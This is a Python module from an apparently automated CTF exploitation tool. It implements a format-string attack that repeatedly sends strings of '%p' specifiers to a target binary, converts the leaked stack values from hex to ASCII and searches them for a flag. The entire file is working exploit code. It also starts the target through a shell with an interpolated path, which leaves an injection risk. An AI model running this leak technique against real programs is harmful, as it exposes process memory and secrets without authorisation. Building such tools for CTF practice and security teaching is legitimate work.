from time import sleep
from typing import List
from exploits.exploit import Exploit
from util.hex_decoder import convert_hex_to_ascii, filter_hex_values
import subprocess


class StringFormatAttack(Exploit):
    def __init__(self):
        super().__init__()

        self._name = "string format attack"
        self._vulnerable_functions = [
            "fprint",
            "printf",
            "sprintf",
            "snprintf",
            "vfprintf",
            "vprintf",
            "vsprintf",
            "vsnprintf",
        ]

    @property
    def name(self) -> str:
        return self._name

    @property
    def vulnerable_functions(self) -> List[str]:
        return self._vulnerable_functions

    def attempt_exploit(self, path):
        print("Attempting string format attack")

        finished = False
        iteration = 0

        while not finished:
            iteration += 4

            process = subprocess.Popen(
                f'"{path}"',
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                text=True,
            )

            while True:
                input_str = " ".join(["%p"] * iteration) + "\n"

                process.stdin.write(input_str)
                process.stdin.flush()

                output = process.stdout.read()
                hex_values = filter_hex_values(output)
                ascii_values = [convert_hex_to_ascii(hex_val) for hex_val in hex_values]

                # to make the strings readable, they needs to be reversed.
                # (since bytes in the buffer are stored using LIFO)
                ascii_values = [value[::-1] for value in ascii_values]

                self.flag_finder.search_for_flag_in_list(ascii_values)

                # if this condition is met it means the input size limit has been reached
                if len(ascii_values) != iteration:
                    finished = True
                    break

                # Give the process the chance to terminate
                sleep(0.001)
                if process.poll() is not None:
                    process.terminate()
                    break
